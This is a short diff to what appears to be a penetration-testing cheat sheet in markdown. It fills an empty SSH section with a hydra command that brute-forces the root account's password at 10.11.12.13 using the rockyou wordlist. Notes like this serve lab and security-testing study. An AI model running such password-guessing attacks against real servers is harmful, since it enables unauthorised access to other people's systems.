@@ -101,7 +101,7 @@ exit
 
 ### SSH
 ```bash
-???
+hydra -l root -P /usr/share/wordlists/rockyou.txt  ssh://10.11.12.13
 ```
 
 ### SMTP
